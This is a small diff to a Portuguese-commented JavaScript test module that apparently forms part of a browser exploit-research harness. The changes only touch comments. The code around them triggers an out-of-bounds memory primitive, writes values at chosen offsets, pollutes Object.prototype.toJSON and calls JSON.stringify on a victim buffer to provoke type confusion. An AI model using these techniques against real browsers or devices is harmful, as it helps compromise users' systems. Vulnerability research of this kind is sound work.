@@ -15,6 +15,7 @@ const FOCUSED_TEST_PARAMS = {
     ppKeyToPollute: 'toJSON',
 };
 
+// Contador global para ser usado pelas variantes de toJSON definidas em runAllAdvancedTestsS3.mjs
 export let currentCallCount_toJSON_for_typeerror_test = 0;
 
 export async function executeTypeErrorInvestigationTest(
@@ -35,7 +36,7 @@ export async function executeTypeErrorInvestigationTest(
     logS3(`   Offset: ${toHex(corruption_offset)}, Valor: ${toHex(value_to_write)}, Aplicar PP: ${applyPrototypePollution}`, "info", FNAME_TEST);
     document.title = `Iniciando: ${testVariantDescription}`;
 
-    currentCallCount_toJSON_for_typeerror_test = 0; 
+    currentCallCount_toJSON_for_typeerror_test = 0; // Reseta o contador para cada teste individual
 
     await triggerOOB_primitive();
     if (!oob_array_buffer_real) {
@@ -97,7 +98,7 @@ export async function executeTypeErrorInvestigationTest(
             document.title = `ERRO Stringify (${e.name}): ${testVariantDescription}`;
             errorOccurred = true;
             logS3(`ERRO CAPTURADO durante JSON.stringify(victim_ab): ${e.name} - ${e.message}.`, "critical", FNAME_TEST);
-            console.error(`JSON.stringify Test Error (${testVariantDescription}):`, e);
+            console.error(`JSON.stringify Test Error (${testVariantDescription}):`, e); // Log para console do dev
         }
 
     } catch (mainError) {
@@ -105,10 +106,9 @@ export async function executeTypeErrorInvestigationTest(
         document.title = `ERRO Principal: ${testVariantDescription}`;
         errorOccurred = true;
         logS3(`Erro principal no teste (${testVariantDescription}): ${mainError.message}`, "error", FNAME_TEST);
-        console.error(mainError);
+        console.error(mainError); // Log para console do dev
     } finally {
         if (pollutionAppliedThisRun) {
-            // Restaurar apenas se foi poluído nesta execução
             if (originalToJSONDescriptor) {
                 Object.defineProperty(Object.prototype, ppKeyToPollute, originalToJSONDescriptor);
             } else {
@@ -120,7 +120,7 @@ export async function executeTypeErrorInvestigationTest(
         logS3(`Ambiente OOB Limpo. Último passo alcançado: ${stepReached}`, "info", FNAME_TEST);
     }
     logS3(`--- Teste de Investigação TypeError Concluído: ${testVariantDescription} (Chamadas toJSON: ${currentCallCount_toJSON_for_typeerror_test}) ---`, "test", FNAME_TEST);
-    if (!errorOccurred && stepReached === "apos_stringify") { // Se completou sem erro explícito
+    if (!errorOccurred && stepReached === "apos_stringify") {
         document.title = `Teste OK: ${testVariantDescription}`;
     }
     return { errorOccurred, calls: currentCallCount_toJSON_for_typeerror_test };
